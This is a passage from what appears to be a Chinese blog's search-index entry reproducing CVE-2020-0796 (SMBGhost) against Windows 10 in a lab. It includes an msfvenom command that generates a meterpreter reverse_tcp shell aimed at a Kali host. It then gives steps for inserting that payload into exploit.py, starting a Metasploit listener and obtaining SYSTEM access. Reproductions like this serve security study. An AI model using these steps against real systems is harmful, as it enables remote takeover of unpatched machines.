windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;kali的地址 lport&#x3D;xxxx -b &#39;\x00&#39; -f python</span><br></pre></td></tr></table></figure><p><img src="/image/image-20201113154029001.png" alt="1"></p><p>为了防止操作失误，可以提前将exploit.py原文件文件进行备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exploit.py exploit.py.bak</span><br></pre></td></tr></table></figure><p><img src="/image/image-20201113154313619.png" alt="1"></p><p>替换payload,将user_payload替换成生成的payload<br>最后一行加上 USER_PAYLOAD = buf 保存并退出</p><p><img src="/image/image-20201113154458905.png" alt="1"><br><img src="/image/image-20201113162050243.png" alt="1"></p><p>在另一个窗口打开MSF开启监听</p><p><img src="/image/image-20201113163518407.png" alt="1"></p><p>执行exploit.py脚本对Win10进行攻击</p><p><img src="/image/image-20201113163832156.png" alt="1"></p><p>再返回查看开启了MSF监听的窗口，已经成功连接（一次不成功可以多试几次）<br><img src="/image/image-20201113163911946.png" alt="1"><br>成功拿到了system权限</p><p>在Win10上查看端口，发现连接<br><img src="/image/image-20201113161527572.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
            <tag> 永恒之黑 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
